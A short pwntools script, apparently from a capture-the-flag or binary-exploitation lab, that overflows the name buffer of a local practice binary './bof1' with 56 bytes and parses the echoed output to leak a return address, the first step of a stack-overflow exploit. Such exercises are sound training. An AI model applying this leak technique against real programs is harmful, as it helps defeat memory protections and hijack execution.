from pwn import *

context.binary = './bof1'
p = process()

# Step 1: overflow payload
payload = b'A' * 56
p.sendafter(b"name? ", payload)

# Step 2:  next question
data = p.recvuntil(b"room number", drop=True)
print(f"[leaked raw output] {data}")

# Step 3: leaked string
index = data.find(b'A' * 56)
if index == -1:
    log.error("Did not find A*56 in output")
    exit(1)

# Step 4: get return address 8 bytes
ret_bytes = data[index + 56 : index + 64]
ret_addr = u64(ret_bytes.ljust(8, b'\x00'))
log.success(f"Leaked return address: {hex(ret_addr)}")

